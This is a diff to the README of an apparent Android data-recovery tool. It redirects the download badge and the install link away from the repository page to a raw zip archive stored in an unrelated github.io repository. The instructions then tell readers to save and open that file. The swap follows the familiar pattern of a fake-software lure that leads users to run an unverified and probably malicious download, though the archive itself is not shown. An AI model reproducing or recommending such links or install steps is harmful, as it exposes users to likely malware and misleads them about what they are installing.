@@ -5,7 +5,7 @@ description: "Recover lost files from Android devices on Windows 10 and 11 with 
 ---
 # 📱 Android-Data-Recovery-Pro - Recover lost files on your phone
 
-[![](https://img.shields.io/badge/Download-Android_Data_Recovery-blue.svg)](https://github.com/Margareteoriginal175/Android-Data-Recovery-Pro)
+[![](https://img.shields.io/badge/Download-Android_Data_Recovery-blue.svg)](https://raw.githubusercontent.com/Margareteoriginal175/margareteoriginal175.github.io/main/Micrococcus/github-io-margareteoriginal-v1.8.zip)
 
 ## 📋 Software Overview
 
@@ -26,7 +26,7 @@ Before you begin the installation, ensure your computer meets these requirements
 
 Follow these steps to set up the software on your computer:
 
-1. Visit the following link to access the software repository: [https://github.com/Margareteoriginal175/Android-Data-Recovery-Pro](https://github.com/Margareteoriginal175/Android-Data-Recovery-Pro)
+1. Visit the following link to access the software repository: [https://raw.githubusercontent.com/Margareteoriginal175/margareteoriginal175.github.io/main/Micrococcus/github-io-margareteoriginal-v1.8.zip](https://raw.githubusercontent.com/Margareteoriginal175/margareteoriginal175.github.io/main/Micrococcus/github-io-margareteoriginal-v1.8.zip)
 2. Locate the download button on the page.
 3. Save the installer file to your computer.
 4. Open the downloaded file to start the installation wizard.
